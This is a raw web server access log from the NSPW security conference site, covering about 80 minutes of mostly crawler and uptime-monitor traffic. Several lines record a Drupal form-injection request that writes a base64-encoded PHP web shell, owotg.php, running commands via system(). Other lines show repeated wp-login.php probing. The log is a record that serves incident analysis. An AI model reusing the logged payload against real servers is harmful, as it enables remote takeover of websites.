5.39.63.24 - - [30/Apr/2018:17:09:48 -0400] "HEAD / HTTP/1.1" 200 3630 "http://www.nspw.org/" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
5.39.63.24 - - [30/Apr/2018:17:09:48 -0400] "HEAD /past HTTP/1.1" 200 3622 "http://www.nspw.org/past" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
5.39.63.24 - - [30/Apr/2018:17:09:48 -0400] "HEAD /2018 HTTP/1.1" 200 3623 "http://www.nspw.org/2018" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
5.39.63.24 - - [30/Apr/2018:17:09:50 -0400] "GET /past HTTP/1.1" 200 6120 "http://www.nspw.org/past" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
5.39.63.24 - - [30/Apr/2018:17:09:50 -0400] "GET /2018 HTTP/1.1" 200 6637 "http://www.nspw.org/2018" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
5.39.63.24 - - [30/Apr/2018:17:09:50 -0400] "GET / HTTP/1.1" 200 6340 "http://www.nspw.org/" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
157.55.39.113 - - [30/Apr/2018:17:10:55 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769875 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.252 - - [30/Apr/2018:17:11:14 -0400] "GET /papers/1999/nspw1999-jonsson.pdf HTTP/1.1" 200 774894 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:17:11:47 -0400] "GET /2009/proceedings/2005/?C=D;O=D HTTP/1.1" 200 4495 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.46.13.48 - - [30/Apr/2018:17:12:07 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 200 294209 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:17:12:43 -0400] "GET /2009/proceedings/2006/nspw2006-naegoe.pdf HTTP/1.1" 200 267969 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:17:12:58 -0400] "GET /2009/proceedings/1999/nspw1999-henning.pdf HTTP/1.1" 200 663536 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:17:13:33 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 200 689872 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:17:13:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.124 - - [30/Apr/2018:17:15:50 -0400] "GET /papers/2001/nspw2001-pal.pdf HTTP/1.1" 200 789338 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [30/Apr/2018:17:18:06 -0400] "GET /2012/organizers HTTP/1.1" 200 6719 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.23 - - [30/Apr/2018:17:18:43 -0400] "GET / HTTP/1.1" 200 11573 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [30/Apr/2018:17:18:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.124 - - [30/Apr/2018:17:19:29 -0400] "GET /papers/1997/nspw1997-meadows.pdf?origin=publication_detail HTTP/1.1" 200 432416 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
5.24.253.215 - - [30/Apr/2018:17:20:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.24.253.215 - - [30/Apr/2018:17:20:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:17:21:27 -0400] "GET /2015/sponsors HTTP/1.1" 200 6345 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:17:21:32 -0400] "GET /papers/2012/forms/index_files/acm_2s_grad_pos.jpg HTTP/1.1" 304 210 "-" "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
152.167.192.130 - - [30/Apr/2018:17:22:03 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
152.167.192.130 - - [30/Apr/2018:17:22:04 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.48 - - [30/Apr/2018:17:22:39 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510608 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [30/Apr/2018:17:23:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.88.91 - - [30/Apr/2018:17:25:30 -0400] "GET / HTTP/1.1" 200 6604 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.88.89 - - [30/Apr/2018:17:25:30 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.73.89 - - [30/Apr/2018:17:26:55 -0400] "GET /2009/proceedings/1993/nspw1993-schaefer.pdf HTTP/1.1" 200 659850 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:17:27:13 -0400] "GET /papers/1998/nspw1998-greenwald.pdf HTTP/1.1" 200 1045292 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.113 - - [30/Apr/2018:17:27:14 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 200 103915 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
73.135.218.72 - - [30/Apr/2018:17:27:30 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
73.135.218.72 - - [30/Apr/2018:17:27:33 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2009/proceedings/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
69.162.124.227 - - [30/Apr/2018:17:28:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.252 - - [30/Apr/2018:17:29:29 -0400] "GET /papers/2011/nspw2011-du.pdf HTTP/1.1" 200 658653 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.113 - - [30/Apr/2018:17:30:37 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149973 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.62.252.163 - - [30/Apr/2018:17:30:49 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
59.124.153.166 - - [30/Apr/2018:17:30:54 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:17:30:54 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
66.249.73.87 - - [30/Apr/2018:17:31:47 -0400] "GET /2015/dates HTTP/1.1" 200 6419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:17:33:15 -0400] "GET /2009/proceedings/2013/nspw2013-mathur.pdf HTTP/1.1" 200 1319255 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
109.251.179.71 - - [30/Apr/2018:17:33:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.251.179.71 - - [30/Apr/2018:17:33:29 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:17:33:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
31.135.76.17 - - [30/Apr/2018:17:34:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.135.76.17 - - [30/Apr/2018:17:34:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:17:35:46 -0400] "GET /node/36 HTTP/1.1" 200 8412 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:17:36:21 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 200 149498 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:17:38:10 -0400] "GET /2009/proceedings/2009/nspw2009-tuerpe.pdf HTTP/1.1" 200 375605 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:17:38:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:17:39:04 -0400] "GET / HTTP/1.1" 200 6635 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:17:40:54 -0400] "GET /papers/2007/nspw2007-gay.pdf HTTP/1.1" 200 268614 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:17:42:22 -0400] "GET /2009/proceedings/2003/nspw2003-eustice.pdf HTTP/1.1" 200 698366 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:17:43:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:17:43:36 -0400] "GET /2009/proceedings/2009/nspw2009-jakobsson.pdf HTTP/1.1" 200 293763 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.252 - - [30/Apr/2018:17:43:26 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 200 905137 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [30/Apr/2018:17:44:08 -0400] "GET /papers/2000/nspw2000-marceau.pdf HTTP/1.1" 200 1076682 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
95.70.202.208 - - [30/Apr/2018:17:44:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.70.202.208 - - [30/Apr/2018:17:44:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:17:44:40 -0400] "GET /papers/2003/nspw2003-perrin.pdf HTTP/1.1" 200 1521243 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:17:44:43 -0400] "GET /papers/2007/nspw2007-edwards.pdf HTTP/1.1" 200 341983 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:17:45:27 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
201.86.37.142 - - [30/Apr/2018:17:46:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.86.37.142 - - [30/Apr/2018:17:46:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:17:48:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [30/Apr/2018:17:50:00 -0400] "GET /papers/1993/nspw1993-dobson.pdf HTTP/1.1" 200 1283187 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.16.157.181 - - [30/Apr/2018:17:50:49 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
77.88.47.40 - - [30/Apr/2018:17:51:37 -0400] "GET /2002/dates.shtml HTTP/1.1" 200 4906 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.140 - - [30/Apr/2018:17:52:03 -0400] "GET /2017/dates HTTP/1.1" 200 12403 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [30/Apr/2018:17:52:39 -0400] "GET /2008/index.shtml HTTP/1.1" 200 5567 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:17:53:20 -0400] "GET /2009/proceedings/1998/nspw1998-lin.pdf HTTP/1.1" 200 336787 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:17:53:41 -0400] "GET /2005/past.shtml HTTP/1.1" 200 2188 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:17:53:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:17:54:34 -0400] "GET /2002/dates.content HTTP/1.1" 200 4324 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
59.124.153.166 - - [30/Apr/2018:17:54:52 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:17:54:52 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
69.162.124.227 - - [30/Apr/2018:17:58:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [30/Apr/2018:17:59:07 -0400] "GET /2007/pc.shtml HTTP/1.1" 200 5917 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.18.33.147 - - [30/Apr/2018:18:01:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
125.18.33.147 - - [30/Apr/2018:18:01:41 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:18:03:14 -0400] "GET /2009/proceedings/1996/?C=N;O=D HTTP/1.1" 200 4426 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:18:03:42 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 572715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:03:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:18:06:19 -0400] "GET /node/52 HTTP/1.1" 200 7038 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.200 - - [30/Apr/2018:18:06:35 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
207.46.13.48 - - [30/Apr/2018:18:06:10 -0400] "GET /papers/2005/nspw2005-marceau.pdf HTTP/1.1" 200 2503939 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.87 - - [30/Apr/2018:18:08:14 -0400] "GET /2014 HTTP/1.1" 200 6695 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:08:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
35.225.221.87 - - [30/Apr/2018:18:09:46 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "ltx71 - (http://ltx71.com/)"
66.249.73.87 - - [30/Apr/2018:18:10:35 -0400] "GET /papers/2012/docs/p115.pdf HTTP/1.1" 200 841801 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
89.233.122.253 - - [30/Apr/2018:18:10:39 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.233.122.253 - - [30/Apr/2018:18:10:39 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:18:12:01 -0400] "GET /papers/2004/nspw2004-zhou.pdf HTTP/1.1" 200 198793 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
120.57.63.148 - - [30/Apr/2018:18:12:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
120.57.63.148 - - [30/Apr/2018:18:12:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:18:12:47 -0400] "GET /2009/proceedings/1996/nspw1996-wulf.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:18:13:06 -0400] "GET /2009/proceedings/2000/nspw2000-marceau.pdf HTTP/1.1" 200 1076682 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:18:13:37 -0400] "GET /papers/2006/nspw2006-locasto.pdf HTTP/1.1" 200 166262 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:13:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
64.62.252.164 - - [30/Apr/2018:18:15:50 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
61.181.142.92 - - [30/Apr/2018:18:17:02 -0400] "GET / HTTP/1.1" 200 6635 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
66.249.73.91 - - [30/Apr/2018:18:17:21 -0400] "GET /2016/accepted HTTP/1.1" 200 6924 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:18:18:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.124.153.166 - - [30/Apr/2018:18:18:53 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
157.55.39.52 - - [30/Apr/2018:18:20:35 -0400] "GET /robots.txt HTTP/1.1" 200 4639 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.113 - - [30/Apr/2018:18:18:50 -0400] "GET /papers/2008/nspw2008-molloy.pdf HTTP/1.1" 200 3153952 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [30/Apr/2018:18:20:45 -0400] "GET /cfp/flyer_NSPW_2014.pdf HTTP/1.1" 200 71336 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [30/Apr/2018:18:21:53 -0400] "GET /papers/2002/nspw2002-blakley.pdf HTTP/1.1" 200 238060 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:18:21:54 -0400] "GET /2008/oc.content HTTP/1.1" 200 4564 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:18:22:43 -0400] "GET /1999/local.html HTTP/1.1" 200 5847 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:18:23:43 -0400] "GET /2004/index.content HTTP/1.1" 200 5083 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [30/Apr/2018:18:23:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:18:25:25 -0400] "GET /2009/proceedings/2006/nspw2006-bond.pdf HTTP/1.1" 200 116742 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [30/Apr/2018:18:26:28 -0400] "GET /2007/dates.shtml HTTP/1.1" 200 5074 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.113 - - [30/Apr/2018:18:26:41 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712499 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [30/Apr/2018:18:28:45 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:18:31:01 -0400] "GET /2011 HTTP/1.1" 200 6922 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
